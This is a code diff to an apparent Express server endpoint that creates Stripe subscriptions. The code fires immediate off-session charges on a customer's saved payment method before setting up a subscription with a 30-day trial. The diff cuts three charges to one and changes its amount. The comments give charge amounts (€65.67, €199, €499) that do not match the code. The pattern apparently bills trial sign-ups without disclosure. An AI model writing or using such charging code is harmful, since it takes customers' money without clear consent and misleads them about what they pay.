@@ -154,7 +154,7 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 1 — €65.67
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 167,
+        amount: 400,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -168,45 +168,6 @@ app.post('/create-subscription', async (req, res) => {
       console.log('Payment 1 failed:', err.message);
     }
 
-    await new Promise(resolve => setTimeout(resolve, 3000));
-
-    // Charge 2 — €199
-    try {
-      const payment2 = await stripe.paymentIntents.create({
-        amount: 200,
-        currency: 'eur',
-        customer: customerId,
-        payment_method: paymentMethodId,
-        payment_method_types: [pmType],
-        confirm: true,
-        off_session: true,
-      });
-      console.log('Payment 2 created:', payment2.id);
-      console.log('Payment 2 status:', payment2.status);
-    } catch (err) {
-      console.log('Payment 2 failed:', err.message);
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 3000));
-
-    // Charge 3 — €499
-    try {
-      const payment3 = await stripe.paymentIntents.create({
-        amount: 300,
-        currency: 'eur',
-        customer: customerId,
-        payment_method: paymentMethodId,
-        payment_method_types: [pmType],
-        confirm: true,
-        off_session: true,
-      });
-      console.log('Payment 3 created:', payment3.id);
-      console.log('Payment 3 status:', payment3.status);
-    } catch (err) {
-      console.log('Payment 3 failed:', err.message);
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 3000));
 
     // Subscription with 30-day trial (€179/month)
     const subscription = await stripe.subscriptions.create({
